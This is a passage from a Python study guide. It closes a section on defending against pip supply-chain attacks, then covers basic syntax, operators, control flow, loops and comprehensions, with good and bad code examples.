# Not: requests>=2.28.0 (vulnerable to supply chain attacks)

# ✅ GOOD: Use Dependabot/Renovate for updates
# Automated, reviewed pull requests for dependency updates
```

**Key Points to Mention:**

1. **setup.py execution**: Code runs during installation
2. **Typosquatting**: Malicious packages with similar names to popular ones
3. **Supply chain attacks**: Compromised legitimate packages
4. **Mitigation**: Hashing, auditing, pinning versions, virtual environments
5. **Defense in depth**: Multiple layers of security

**Why This Matters:** Supply chain attacks targeting pip packages are increasing. The 2022 PyTorch incident compromised packages on PyPI, and numerous typosquatting attacks occur monthly.

**Follow-up Questions:**

- How does pip's hash checking prevent tampering?
- What's the difference between `pip install` and `pip install --user`?
- How would you build a secure CI/CD pipeline for Python?

**Common Mistakes:**

- Installing packages as root/sudo (expands attack surface)
- Not pinning versions in production
- Ignoring security warnings
- Not reviewing dependency updates

---

### Key Takeaways

- **Python is versatile** but has trade-offs: Great for productivity, but slower than compiled languages
- **CPython is the standard**: Use PyPy for performance, other implementations for specific ecosystems
- **Always use virtual environments**: Isolate project dependencies to prevent conflicts
- **Modern tooling matters**: pyproject.toml, Poetry, and pyenv streamline development
- **Security is critical**: Audit dependencies, pin versions, use hash checking
- **Environment management is foundational**: Proper setup prevents 90% of "works on my machine" issues
- **Choose tools based on context**: conda for data science, pip+venv for web development, Poetry for modern projects

---

## 1.3 Python Syntax & Basic Constructs

**SDLC Phase:** Development

**Relevant For:**

- [ ] Requirements gathering
- [ ] System design
- [X] Development
- [ ] Testing
- [ ] Deployment
- [ ] Maintenance

This section covers Python's fundamental syntax elements that form the foundation of all Python code.

### Variables & Data Types

Python uses dynamic typing, meaning variables don't need explicit type declarations:

```python
# ✅ Dynamic typing - type inferred from value
name = "Alice"  # str
age = 30  # int
height = 5.6  # float
is_active = True  # bool

# Variable can change type (though often not recommended)
x = 10  # int
x = "now a string"  # str - legal but confusing

# ❌ BAD: Changing variable types
count = 100
count = "hundred"  # Type changed - confusing

# ✅ GOOD: Keep consistent types
count = 100
count = 200  # Same type
```

#### Type Inference

Python infers types at runtime:

```python
# Type is determined by assigned value
number = 42  # int
result = 3.14  # float
message = "Hello"  # str
is_valid = True  # bool

# Check type at runtime
print(type(number))  # <class 'int'>
print(type(result))  # <class 'float'>

# isinstance() for type checking
if isinstance(number, int):
    print("It's an integer")

# Multiple type check
if isinstance(message, (str, bytes)):
    print("It's a string or bytes")
```

#### Variable Naming Conventions (PEP 8)

```python
# ✅ GOOD: Lowercase with underscores (snake_case)
user_name = "Alice"
total_count = 100
max_retry_attempts = 3

# ✅ GOOD: Constants in UPPERCASE
MAX_CONNECTIONS = 100
API_KEY = "secret"
DEFAULT_TIMEOUT = 30

# ✅ GOOD: Class names in PascalCase
class UserAccount:
    pass

class DatabaseConnection:
    pass

# ❌ BAD: camelCase (not Pythonic)
userName = "Alice"
totalCount = 100

# ❌ BAD: Single letter (except in loops, math)
a = "Alice"  # Not descriptive
x = 100  # What does x represent?

# ✅ GOOD: Single letter in specific contexts
for i in range(10):  # Loop counter
    print(i)

# Mathematical formulas
a, b, c = 1, 2, 3
result = a * x**2 + b * x + c  # Quadratic formula

# ❌ BAD: Reserved keywords
class = "Python"  # SyntaxError
def = 10  # SyntaxError

# ⚠️ CAUTION: Shadowing built-ins (legal but bad)
list = [1, 2, 3]  # Shadows built-in list()
print(list([1, 2, 3]))  # TypeError: 'list' object is not callable

# Private variables (convention, not enforced)
_internal_value = 42  # Single underscore: internal use
__private_value = 42  # Double underscore: name mangling
```

#### None and NoneType

`None` represents the absence of a value:

```python
# None is a singleton object
result = None
data = None

# Check for None
if result is None:  # ✅ GOOD: Use 'is'
    print("No result")

if result == None:  # ⚠️ Works but not idiomatic
    print("No result")

# None is falsy
if not result:  # ✅ GOOD: Pythonic
    print("No result")

# Function returns None by default
def no_return():
    pass

result = no_return()
print(result)  # None

# Explicit return None
def explicit_none():
    return None

# Common pattern: Optional return value
def find_user(user_id):
    # Database lookup
    if user_id == 123:
        return {"id": 123, "name": "Alice"}
    return None  # User not found

user = find_user(456)
if user is None:
    print("User not found")
```

#### Boolean Values and Truthiness

```python
# Boolean literals
is_active = True
is_deleted = False

# Falsy values in Python
bool(False)  # False
bool(None)  # False
bool(0)  # False
bool(0.0)  # False
bool("")  # False (empty string)
bool([])  # False (empty list)
bool({})  # False (empty dict)
bool(())  # False (empty tuple)
bool(set())  # False (empty set)

# Truthy values
bool(True)  # True
bool(1)  # True
bool(-1)  # True (any non-zero number)
bool("text")  # True (non-empty string)
bool([1])  # True (non-empty list)
bool({"key": "value"})  # True (non-empty dict)

# Idiomatic Python: Use truthiness
# ✅ GOOD
items = []
if not items:  # Check if empty
    print("No items")

name = "Alice"
if name:  # Check if string is not empty
    print(f"Hello, {name}")

# ❌ BAD: Explicit comparisons
if items == []:  # Verbose
    print("No items")

if len(items) == 0:  # Unnecessary len()
    print("No items")

# ⚠️ CAUTION: Be careful with 0 and empty string
count = 0
if count:  # False (0 is falsy)
    print("Has count")  # Won't print

# ✅ GOOD: Explicit when 0 is valid
if count is not None:
    print(f"Count: {count}")
```

#### Numeric Types

**Integers (int):**

```python
# Python 3 integers have unlimited precision
small = 10
large = 10**100  # 1 followed by 100 zeros
huge = 2**1000  # No overflow!

# Different bases
binary = 0b1010  # 10 in decimal
octal = 0o12  # 10 in decimal
hex_num = 0xA  # 10 in decimal

# Underscores for readability (Python 3.6+)
million = 1_000_000
billion = 1_000_000_000

# Integer operations
a = 10
b = 3
sum_result = a + b  # 13
difference = a - b  # 7
product = a * b  # 30
quotient = a / b  # 3.333... (float division)
floor_div = a // b  # 3 (floor division)
remainder = a % b  # 1 (modulo)
power = a ** b  # 1000 (exponentiation)
```

**Floats (float):**

```python
# Floating-point numbers (64-bit, IEEE 754)
pi = 3.14159
e = 2.71828

# Scientific notation
speed_of_light = 3e8  # 3 * 10^8
planck = 6.62607e-34  # 6.62607 * 10^-34

# Float precision issues
result = 0.1 + 0.2
print(result)  # 0.30000000000000004 (not exactly 0.3!)

# ✅ GOOD: Use Decimal for precision
from decimal import Decimal
d1 = Decimal('0.1')
d2 = Decimal('0.2')
print(d1 + d2)  # 0.3 (exact)

# ✅ GOOD: Compare floats with tolerance
import math
def is_close(a, b, tolerance=1e-9):
    return abs(a - b) < tolerance

# Or use math.isclose (Python 3.5+)
math.isclose(0.1 + 0.2, 0.3)  # True

# Float special values
infinity = float('inf')
neg_infinity = float('-inf')
not_a_number = float('nan')

print(1 / 0)  # ZeroDivisionError
print(float('inf') > 1000000)  # True
```

**Complex Numbers:**

```python
# Complex numbers (real + imaginary)
z1 = 3 + 4j
z2 = complex(3, 4)  # Same as above

# Access components
print(z1.real)  # 3.0
print(z1.imag)  # 4.0

# Complex operations
z3 = (2 + 3j) + (1 + 2j)  # (3+5j)
z4 = (2 + 3j) * (1 + 2j)  # (-4+7j)

# Conjugate
conj = z1.conjugate()  # (3-4j)

# Magnitude
import cmath
magnitude = abs(z1)  # 5.0
phase = cmath.phase(z1)  # 0.93 radians
```

#### Arbitrary Precision Integers

Python 3 integers automatically handle large numbers:

```python
# No integer overflow in Python 3!
factorial_100 = 1
for i in range(1, 101):
    factorial_100 *= i

print(factorial_100)
# 93326215443944152681699238856266700490715968264381621468592963895217599993229915608941463976156518286253697920827223758251185210916864000000000000000000000000

# Memory is the only limit
huge = 10**100000  # Takes time but works

# Compare with other languages:
# C/C++: int overflow
# Java: need BigInteger
# Python: just works!
```

#### String Types

**str (Unicode Strings):**

```python
# Strings are immutable sequences of Unicode characters
text = "Hello, World!"
unicode_text = "Hello, 世界! 🌍"

# String creation
single = 'Single quotes'
double = "Double quotes"
triple = """
Multi-line
string
"""

# Raw strings (no escape sequences)
path = r"C:\Users\name"  # \ not treated as escape
regex = r"\d+\.\d+"  # Useful for regex

# f-strings (Python 3.6+) - BEST for formatting
name = "Alice"
age = 30
message = f"Hello, {name}! You are {age} years old."

# Expressions in f-strings
result = f"2 + 2 = {2 + 2}"  # "2 + 2 = 4"
formatted = f"Pi: {3.14159:.2f}"  # "Pi: 3.14"

# String concatenation
# ❌ BAD: + in loops (creates new string each time)
result = ""
for i in range(1000):
    result += str(i)  # O(n²) performance!

# ✅ GOOD: join() method
result = "".join(str(i) for i in range(1000))  # O(n)

# ✅ GOOD: f-strings for simple cases
greeting = f"{first_name} {last_name}"
```

**bytes and bytearray:**

```python
# bytes: Immutable sequence of bytes
b = b"Hello"  # Bytes literal
b2 = bytes([72, 101, 108, 108, 111])  # From list
b3 = "Hello".encode('utf-8')  # From string

# bytearray: Mutable sequence of bytes
ba = bytearray(b"Hello")
ba[0] = 74  # Modify
print(ba)  # bytearray(b'Jello')

# Common use: Binary file I/O, network protocols
with open('file.bin', 'rb') as f:
    data = f.read()  # Returns bytes

# Encoding and decoding
text = "Hello, 世界!"
encoded = text.encode('utf-8')  # bytes
decoded = encoded.decode('utf-8')  # str

# ⚠️ CAUTION: Encoding errors
try:
    b"\xff\xfe".decode('utf-8')
except UnicodeDecodeError as e:
    print(f"Decode error: {e}")
    # Handle with: 'ignore', 'replace', 'backslashreplace'
    decoded = b"\xff\xfe".decode('utf-8', errors='replace')
```

#### String Encoding (UTF-8, ASCII, Unicode)

```python
# Unicode basics
char = 'A'
print(ord(char))  # 65 (Unicode code point)
print(chr(65))  # 'A'

# UTF-8 encoding (variable length)
text = "Hello, 世界!"
utf8 = text.encode('utf-8')
print(len(text))  # 10 characters
print(len(utf8))  # 16 bytes (世 and 界 take 3 bytes each)

# ASCII encoding (1 byte per char, limited)
ascii_text = "Hello"
ascii_bytes = ascii_text.encode('ascii')
print(len(ascii_bytes))  # 5 bytes

# ❌ ASCII can't encode non-ASCII characters
try:
    "世界".encode('ascii')
except UnicodeEncodeError:
    print("ASCII can't encode non-ASCII characters")

# ✅ GOOD: Always use UTF-8 unless you have a reason
text = "Mixed ASCII and 中文"
utf8_bytes = text.encode('utf-8')
decoded = utf8_bytes.decode('utf-8')

# Other encodings
latin1 = "café".encode('latin-1')  # Western European
cp1252 = "café".encode('cp1252')  # Windows Western European
```

#### Type Conversion and Casting

```python
# Explicit conversions
int_val = int("42")  # String to int: 42
float_val = float("3.14")  # String to float: 3.14
str_val = str(42)  # Int to string: "42"
bool_val = bool(1)  # Int to bool: True

# ⚠️ CAUTION: ValueError on invalid conversion
try:
    int("abc")  # ValueError: invalid literal
except ValueError as e:
    print(f"Conversion error: {e}")

# Safe conversion with default
def safe_int(value, default=0):
    try:
        return int(value)
    except (ValueError, TypeError):
        return default

result = safe_int("abc", 0)  # Returns 0
result = safe_int("42", 0)  # Returns 42

# Number conversions
int_from_float = int(3.14)  # 3 (truncates)
float_from_int = float(42)  # 42.0
complex_from_float = complex(3.14)  # (3.14+0j)

# String to bool (tricky!)
print(bool("False"))  # True (non-empty string is truthy!)
print(bool(""))  # False (empty string is falsy)

# ✅ GOOD: Parse boolean strings explicitly
def str_to_bool(value):
    return value.lower() in ('true', '1', 'yes', 'on')

print(str_to_bool("True"))  # True
print(str_to_bool("False"))  # False
```

### Operators

#### Arithmetic Operators

```python
a = 10
b = 3

addition = a + b  # 13
subtraction = a - b  # 7
multiplication = a * b  # 30
division = a / b  # 3.333... (always returns float)
floor_division = a // b  # 3 (integer division)
modulo = a % b  # 1 (remainder)
exponentiation = a ** b  # 1000

# Floor division with negative numbers
print(-10 // 3)  # -4 (rounds toward negative infinity)
print(10 // -3)  # -4

# ✅ GOOD: Use // for integer division
items_per_page = 10
total_items = 47
total_pages = (total_items + items_per_page - 1) // items_per_page  # 5

# Or use math.ceil
import math
total_pages = math.ceil(total_items / items_per_page)  # 5

# Modulo for cycling
for i in range(10):
    day = i % 7  # 0-6 (week cycle)
    print(f"Day {i}: {day}")
```

#### Comparison Operators

```python
# Equality and inequality
10 == 10  # True (equal value)
10 != 5  # True (not equal)

# Magnitude comparisons
10 > 5  # True
10 < 5  # False
10 >= 10  # True
10 <= 10  # True

# ⚠️ CAUTION: Floating-point equality
0.1 + 0.2 == 0.3  # False! (floating-point precision)

# ✅ GOOD: Use math.isclose for floats
import math
math.isclose(0.1 + 0.2, 0.3)  # True

# Chained comparisons (Pythonic!)
x = 5
1 < x < 10  # True (equivalent to: 1 < x and x < 10)
0 <= score <= 100  # Range check

# String comparison (lexicographic)
"apple" < "banana"  # True
"Apple" < "banana"  # True (uppercase comes first in ASCII)

# ⚠️ CAUTION: Comparing different types
"10" == 10  # False (different types)
None == 0  # False
```

#### Identity Operators (is, is not)

```python
# 'is' checks object identity (same object in memory)
# '==' checks value equality

a = [1, 2, 3]
b = [1, 2, 3]
c = a

a == b  # True (same value)
a is b  # False (different objects)
a is c  # True (same object)

# Small integers are cached (CPython implementation detail)
x = 256
y = 256
x is y  # True (-5 to 256 are cached)

x = 257
y = 257
x is y  # Might be False (depends on context)

# ✅ GOOD: Use 'is' only for None, True, False
if value is None:  # Correct
    print("No value")

if value is not None:  # Correct
    print(f"Value: {value}")

# ❌ BAD: Using 'is' for value comparison
if name is "Alice":  # Wrong! Use ==
    print("Hello, Alice")

# ✅ GOOD: Use == for value comparison
if name == "Alice":  # Correct
    print("Hello, Alice")
```

#### Logical Operators (and, or, not)

```python
# and: Returns first falsy value or last value
True and True  # True
True and False  # False
10 and 20  # 20 (both truthy, returns last)
0 and 20  # 0 (first is falsy)

# or: Returns first truthy value or last value
True or False  # True
False or False  # False
10 or 20  # 10 (first is truthy)
0 or 20  # 20 (first is falsy)
0 or 0  # 0 (both falsy, returns last)

# not: Boolean negation
not True  # False
not False  # True
not 0  # True
not "text"  # False

# Short-circuit evaluation
def expensive():
    print("Called expensive()")
    return True

# 'and' short-circuits
False and expensive()  # expensive() not called

# 'or' short-circuits
True or expensive()  # expensive() not called

# ✅ GOOD: Use short-circuit for conditional execution
data = get_data() or get_default()  # If get_data() returns falsy

# ✅ GOOD: Guard clauses
if user and user.is_active and user.has_permission('admin'):
    # All conditions must be true
    grant_admin_access()

# ⚠️ CAUTION: Order matters
# ❌ BAD
if user.is_active and user:  # AttributeError if user is None
    pass

# ✅ GOOD
if user and user.is_active:  # Safe
    pass
```

#### Bitwise Operators

```python
# Bitwise AND
12 & 10  # 8 (1100 & 1010 = 1000)

# Bitwise OR
12 | 10  # 14 (1100 | 1010 = 1110)

# Bitwise XOR (exclusive OR)
12 ^ 10  # 6 (1100 ^ 1010 = 0110)

# Bitwise NOT (inverts bits)
~12  # -13 (inverts and adds 1 due to two's complement)

# Left shift (multiply by 2^n)
4 << 2  # 16 (4 * 2^2 = 16)

# Right shift (divide by 2^n)
16 >> 2  # 4 (16 / 2^2 = 4)

# Use cases:
# 1. Flags and permissions
READ = 1  # 001
WRITE = 2  # 010
EXECUTE = 4  # 100

permissions = READ | WRITE  # 011 (3)
has_read = permissions & READ  # 001 (non-zero = True)
has_execute = permissions & EXECUTE  # 000 (zero = False)

# 2. Fast multiplication/division by powers of 2
value = 7
doubled = value << 1  # Faster than value * 2
halved = value >> 1  # Faster than value // 2

# 3. Swap two values without temporary variable
a, b = 5, 10
a ^= b
b ^= a
a ^= b
print(a, b)  # 10, 5 (but Pythonic way is: a, b = b, a)
```

#### Membership Operators (in, not in)

```python
# Check if element is in container
fruits = ['apple', 'banana', 'orange']
'apple' in fruits  # True
'grape' in fruits  # False
'grape' not in fruits  # True

# Works with strings
'hello' in 'hello world'  # True
'bye' in 'hello world'  # False

# Dictionary membership (checks keys, not values)
user = {'name': 'Alice', 'age': 30}
'name' in user  # True
'Alice' in user  # False (not a key)

# ✅ GOOD: Check key existence
if 'email' in user:
    print(user['email'])
else:
    print("No email")

# Or use .get() with default
email = user.get('email', 'no-email@example.com')

# Set membership (very fast, O(1))
large_set = set(range(1000000))
999999 in large_set  # Fast!

# ⚠️ CAUTION: List membership is O(n)
large_list = list(range(1000000))
999999 in large_list  # Slow!

# ✅ GOOD: Use set for membership tests
items = set(large_list)  # Convert once
999999 in items  # Fast!
```

#### Operator Precedence

```python
# Precedence (high to low):
# 1. Parentheses ()
# 2. Exponentiation **
# 3. Unary +, -, ~
# 4. *, /, //, %
# 5. +, - (binary)
# 6. <<, >>
# 7. &
# 8. ^
# 9. |
# 10. Comparisons (==, !=, <, >, <=, >=, is, in)
# 11. not
# 12. and
# 13. or

# Examples:
result = 2 + 3 * 4  # 14 (not 20)
result = (2 + 3) * 4  # 20

result = 2 ** 3 ** 2  # 512 (right-associative: 2 ** (3 ** 2))
result = (2 ** 3) ** 2  # 64

# ✅ GOOD: Use parentheses for clarity
result = (a + b) / (c + d)  # Clear intent

# ❌ BAD: Relying on complex precedence
result = a + b / c + d  # Confusing

# Complex boolean expressions
if (age >= 18 and age < 65) or has_special_permit:
    allow_entry()

# ✅ GOOD: Parentheses for readability
if ((age >= 18) and (age < 65)) or has_special_permit:
    allow_entry()
```

#### Operator Overloading

```python
class Vector:
    def __init__(self, x, y):
        self.x = x
        self.y = y
  
    # Overload + operator
    def __add__(self, other):
        return Vector(self.x + other.x, self.y + other.y)
  
    # Overload * operator (scalar multiplication)
    def __mul__(self, scalar):
        return Vector(self.x * scalar, self.y * scalar)
  
    # Overload == operator
    def __eq__(self, other):
        return self.x == other.x and self.y == other.y
  
    # String representation
    def __repr__(self):
        return f"Vector({self.x}, {self.y})"

v1 = Vector(1, 2)
v2 = Vector(3, 4)

v3 = v1 + v2  # Calls __add__
print(v3)  # Vector(4, 6)

v4 = v1 * 2  # Calls __mul__
print(v4)  # Vector(2, 4)

print(v1 == Vector(1, 2))  # Calls __eq__: True
```

### Control Flow

#### if/elif/else Statements

```python
# Basic if statement
age = 18
if age >= 18:
    print("Adult")

# if-else
if age >= 18:
    print("Adult")
else:
    print("Minor")

# if-elif-else chain
score = 85
if score >= 90:
    grade = 'A'
elif score >= 80:
    grade = 'B'
elif score >= 70:
    grade = 'C'
elif score >= 60:
    grade = 'D'
else:
    grade = 'F'

# ✅ GOOD: Use early returns (guard clauses)
def process_user(user):
    if user is None:
        return  # Early return
  
    if not user.is_active:
        return  # Early return
  
    # Main logic here
    perform_processing(user)

# ❌ BAD: Nested if statements
def process_user(user):
    if user is not None:
        if user.is_active:
            # Deep nesting makes code hard to read
            perform_processing(user)
```

#### Truthiness and Falsy Values

```python
# Using truthiness in conditions
# ✅ GOOD: Idiomatic Python
items = []
if not items:  # Empty list is falsy
    print("No items")

name = ""
if not name:  # Empty string is falsy
    print("No name")

count = 0
if count:  # 0 is falsy
    print("Has count")  # Won't print

# ❌ BAD: Explicit comparisons
if items == []:  # Verbose
    print("No items")

if len(items) == 0:  # Unnecessary
    print("No items")

# ⚠️ CAUTION: None vs empty vs 0
value = None
if value is None:  # Correct: Check for None
    print("No value")

value = 0
if value is None:  # False (0 is not None)
    print("No value")

if not value:  # True (0 is falsy)
    print("Falsy value")

# ✅ GOOD: Be explicit when needed
if value is not None:  # Checks for None specifically
    print(f"Value: {value}")  # Prints even if value is 0 or ""
```

#### Ternary Conditional Expressions

```python
# Ternary operator (conditional expression)
age = 18
status = "Adult" if age >= 18 else "Minor"

# Equivalent to:
if age >= 18:
    status = "Adult"
else:
    status = "Minor"

# ✅ GOOD: Simple conditions
max_value = a if a > b else b

# ✅ GOOD: Default values
name = user_input if user_input else "Anonymous"

# ❌ BAD: Complex or nested ternaries
result = (a if a > b else b) if (a + b > 10) else (c if c > d else d)
# Hard to read!

# ✅ GOOD: Use regular if for complex logic
if a + b > 10:
    result = a if a > b else b
else:
    result = c if c > d else d

# Ternary with function calls
def expensive_operation():
    return 42

# ✅ Short-circuit: expensive_operation() called only if condition True
result = expensive_operation() if should_run else default_value
```

#### match/case (Python 3.10+)

Pattern matching provides a more elegant alternative to if-elif chains:

```python
# Basic match statement (Python 3.10+)
def http_status(code):
    match code:
        case 200:
            return "OK"
        case 404:
            return "Not Found"
        case 500:
            return "Internal Server Error"
        case _:  # Default case (like else)
            return "Unknown"

# Pattern matching with OR (|)
def categorize_code(code):
    match code:
        case 200 | 201 | 204:
            return "Success"
        case 400 | 401 | 403 | 404:
            return "Client Error"
        case 500 | 502 | 503:
            return "Server Error"
        case _:
            return "Unknown"

# Pattern matching with guards (if conditions)
def describe_age(age):
    match age:
        case n if n < 0:
            return "Invalid"
        case n if n < 18:
            return "Minor"
        case n if n < 65:
            return "Adult"
        case _:
            return "Senior"

# Destructuring patterns
def describe_point(point):
    match point:
        case (0, 0):
            return "Origin"
        case (0, y):
            return f"Y-axis at {y}"
        case (x, 0):
            return f"X-axis at {x}"
        case (x, y):
            return f"Point at ({x}, {y})"

print(describe_point((0, 0)))  # "Origin"
print(describe_point((0, 5)))  # "Y-axis at 5"
print(describe_point((3, 4)))  # "Point at (3, 4)"

# Matching dictionaries
def process_command(command):
    match command:
        case {"action": "create", "type": "user"}:
            create_user()
        case {"action": "delete", "type": "user", "id": user_id}:
            delete_user(user_id)
        case {"action": "update", "type": "user", "id": user_id, "data": data}:
            update_user(user_id, data)
        case _:
            print("Unknown command")

# Class pattern matching
from dataclasses import dataclass

@dataclass
class Point:
    x: int
    y: int

def describe(obj):
    match obj:
        case Point(x=0, y=0):
            return "Origin"
        case Point(x=x, y=0):
            return f"On X-axis at {x}"
        case Point(x=0, y=y):
            return f"On Y-axis at {y}"
        case Point(x=x, y=y):
            return f"Point({x}, {y})"

# ✅ GOOD: match for complex pattern matching
# ❌ BAD: Using match for simple if-else
# Use regular if for 1-2 cases
if code == 200:
    return "OK"
else:
    return "Error"
```

### Loops

#### for Loops and Iteration

Python's `for` loop iterates over any iterable object:

```python
# Basic for loop
fruits = ['apple', 'banana', 'orange']
for fruit in fruits:
    print(fruit)

# Iterate over string
for char in "Python":
    print(char)  # P, y, t, h, o, n

# Iterate over dictionary
user = {'name': 'Alice', 'age': 30, 'city': 'NYC'}

# Keys (default)
for key in user:
    print(key)  # name, age, city

# Keys explicitly
for key in user.keys():
    print(key)

# Values
for value in user.values():
    print(value)  # Alice, 30, NYC

# Key-value pairs
for key, value in user.items():
    print(f"{key}: {value}")

# range() for numeric iteration
for i in range(5):
    print(i)  # 0, 1, 2, 3, 4

for i in range(2, 10):  # Start, stop
    print(i)  # 2, 3, ..., 9

for i in range(0, 10, 2):  # Start, stop, step
    print(i)  # 0, 2, 4, 6, 8

# Reverse range
for i in range(10, 0, -1):
    print(i)  # 10, 9, 8, ..., 1

# enumerate() for index and value
fruits = ['apple', 'banana', 'orange']
for index, fruit in enumerate(fruits):
    print(f"{index}: {fruit}")
# 0: apple
# 1: banana
# 2: orange

# enumerate() with custom start
for index, fruit in enumerate(fruits, start=1):
    print(f"{index}: {fruit}")
# 1: apple
# 2: banana
# 3: orange

# zip() to iterate multiple sequences
names = ['Alice', 'Bob', 'Charlie']
ages = [25, 30, 35]
for name, age in zip(names, ages):
    print(f"{name} is {age} years old")

# ✅ GOOD: zip stops at shortest sequence
names = ['Alice', 'Bob', 'Charlie']
ages = [25, 30]
for name, age in zip(names, ages):
    print(f"{name}: {age}")  # Only Alice and Bob

# zip_longest for handling different lengths
from itertools import zip_longest
for name, age in zip_longest(names, ages, fillvalue='Unknown'):
    print(f"{name}: {age}")
# Alice: 25
# Bob: 30
# Charlie: Unknown
```

#### while Loops

```python
# Basic while loop
count = 0
while count < 5:
    print(count)
    count += 1

# ⚠️ CAUTION: Infinite loop
while True:
    user_input = input("Enter 'quit' to exit: ")
    if user_input == 'quit':
        break
    process_input(user_input)

# ✅ GOOD: Use for loop when iteration count is known
# ❌ BAD
i = 0
while i < len(items):
    print(items[i])
    i += 1

# ✅ GOOD
for item in items:
    print(item)

# ✅ GOOD: while for unknown iteration count
while not is_complete():
    do_work()
    time.sleep(1)
```

#### break and continue

```python
# break: Exit loop immediately
for i in range(10):
    if i == 5:
        break  # Exit loop
    print(i)  # 0, 1, 2, 3, 4

# continue: Skip to next iteration
for i in range(10):
    if i % 2 == 0:
        continue  # Skip even numbers
    print(i)  # 1, 3, 5, 7, 9

# Nested loops with break
found = False
for i in range(10):
    for j in range(10):
        if i * j == 20:
            found = True
            break  # Only breaks inner loop
    if found:
        break  # Break outer loop

# ✅ GOOD: Use function with return for cleaner exit
def find_product():
    for i in range(10):
        for j in range(10):
            if i * j == 20:
                return (i, j)  # Exits both loops
    return None

result = find_product()
```

#### else Clauses on Loops

Python's unique feature: `else` clause on loops:

```python
# else on for loop
# Executes if loop completes normally (no break)
for i in range(5):
    if i == 10:
        break
else:
    print("Loop completed normally")  # This prints

# Common use: Search pattern
def find_user(user_id, users):
    for user in users:
        if user['id'] == user_id:
            return user
            break
    else:
        # Executes if user not found
        return None

# else on while loop
count = 0
while count < 5:
    print(count)
    count += 1
else:
    print("While loop completed")  # This prints

# ✅ GOOD: Use for search patterns
numbers = [1, 3, 5, 7, 9]
for num in numbers:
    if num % 2 == 0:
        print("Found even number")
        break
else:
    print("No even numbers found")  # This prints

# ❌ BAD: else on loops is often confusing
# Consider using a function with return instead
def has_even(numbers):
    for num in numbers:
        if num % 2 == 0:
            return True
    return False  # Clearer than else clause
```

#### Loop Optimization Techniques

```python
# ❌ BAD: Recalculating in loop
for i in range(1000):
    result = expensive_function()  # Called 1000 times!
    process(result, i)

# ✅ GOOD: Calculate once before loop
result = expensive_function()  # Called once
for i in range(1000):
    process(result, i)

# ❌ BAD: Growing list with append
result = []
for i in range(1000000):
    result.append(i * 2)

# ✅ GOOD: List comprehension (faster)
result = [i * 2 for i in range(1000000)]

# ❌ BAD: Membership test in list
large_list = list(range(10000))
for item in items:
    if item in large_list:  # O(n) for each check!
        process(item)

# ✅ GOOD: Convert to set for O(1) lookup
large_set = set(range(10000))  # Convert once
for item in items:
    if item in large_set:  # O(1) lookup
        process(item)

# ❌ BAD: Modifying list while iterating
items = [1, 2, 3, 4, 5]
for item in items:
    if item % 2 == 0:
        items.remove(item)  # Dangerous! Skips elements

# ✅ GOOD: Iterate over copy or use list comprehension
items = [1, 2, 3, 4, 5]
for item in items[:]:  # Iterate over copy
    if item % 2 == 0:
        items.remove(item)

# ✅ BETTER: List comprehension
items = [item for item in items if item % 2 != 0]

# ✅ BEST: Filter
items = list(filter(lambda x: x % 2 != 0, items))
```

#### Avoiding Infinite Loops

```python
# ❌ BAD: Easy to create infinite loop
while count > 0:
    # Forgot to decrement count!
    print(count)

# ✅ GOOD: Add safety check
max_iterations = 1000
iterations = 0
while not is_done():
    if iterations >= max_iterations:
        raise RuntimeError("Max iterations exceeded")
    do_work()
    iterations += 1

# ✅ GOOD: Use for loop when possible
for _ in range(max_iterations):
    if is_done():
        break
    do_work()

# ⚠️ CAUTION: Be careful with floating-point conditions
# ❌ BAD: May never equal exactly 1.0
x = 0.0
while x != 1.0:
    x += 0.1  # 0.1 can't be represented exactly in binary
    print(x)

# ✅ GOOD: Use inequality
x = 0.0
while x < 1.0:
    x += 0.1
    print(x)
```

### Comprehensions

List, dict, and set comprehensions provide concise syntax for creating collections.

#### List Comprehensions

```python
# Basic list comprehension
squares = [x**2 for x in range(10)]
# [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]

# Equivalent to:
squares = []
for x in range(10):
    squares.append(x**2)

# ✅ GOOD: List comprehension is more concise and faster

# With condition (filter)
evens = [x for x in range(20) if x % 2 == 0]
# [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]

# With transformation and condition
doubled_evens = [x * 2 for x in range(20) if x % 2 == 0]

# Multiple conditions (AND)
filtered = [x for x in range(100) if x % 2 == 0 if x % 3 == 0]
# Same as: if x % 2 == 0 and x % 3 == 0

# if-else in comprehension (must come before for)
result = ["Even" if x % 2 == 0 else "Odd" for x in range(10)]
# ['Even', 'Odd', 'Even', 'Odd', ...]

# Flattening nested lists
matrix = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]
flattened = [num for row in matrix for num in row]
# [1, 2, 3, 4, 5, 6, 7, 8, 9]

# Equivalent nested loops:
flattened = []
for row in matrix:
    for num in row:
        flattened.append(num)

# ✅ GOOD: List comprehensions for simple transformations
names = [user['name'] for user in users]

# ❌ BAD: Complex logic in comprehension
result = [
    complex_function(x, y, z) if condition1(x) and condition2(y) else default_value(z)
    for x, y, z in zip(list1, list2, list3)
    if x > 0 and y < 100 and z != None
]
# Hard to read!

# ✅ GOOD: Use regular loop for complex logic
result = []
for x, y, z in zip(list1, list2, list3):
    if x > 0 and y < 100 and z is not None:
        if condition1(x) and condition2(y):
            result.append(complex_function(x, y, z))
        else:
            result.append(default_value(z))
```

#### Dict Comprehensions

```python
# Basic dict comprehension
squares = {x: x**2 for x in range(5)}
# {0: 0, 1: 1, 2: 4, 3: 9, 4: 16}

# From two lists
keys = ['a', 'b', 'c']
values = [1, 2, 3]
mapping = {k: v for k, v in zip(keys, values)}
# {'a': 1, 'b': 2, 'c': 3}

# Inverting a dictionary
original = {'a': 1, 'b': 2, 'c': 3}
inverted = {v: k for k, v in original.items()}
# {1: 'a', 2: 'b', 3: 'c'}

# With condition
filtered = {k: v for k, v in original.items() if v > 1}
# {'b': 2, 'c': 3}

# Transforming keys and values
user_data = {'name': 'alice', 'age': '30', 'city': 'nyc'}
cleaned = {k.upper(): v.upper() for k, v in user_data.items()}
# {'NAME': 'ALICE', 'AGE': '30', 'CITY': 'NYC'}

# ✅ GOOD: Convert list of tuples to dict
pairs = [('a', 1), ('b', 2), ('c', 3)]
mapping = {k: v for k, v in pairs}

# Or use dict() constructor
mapping = dict(pairs)  # Simpler when no transformation needed
```

#### Set Comprehensions

```python
# Basic set comprehension
squares = {x**2 for x in range(10)}
# {0, 1, 4, 9, 16, 25, 36, 49, 64, 81}

# Note: Automatically removes duplicates
remainders = {x % 3 for x in range(10)}
# {0, 1, 2}

# With condition
evens = {x for x in range(20) if x % 2 == 0}
# {0, 2, 4, 6, 8, 10, 12, 14, 16, 18}

# Extract unique values
words = ['apple', 'banana', 'apple', 'orange', 'banana']
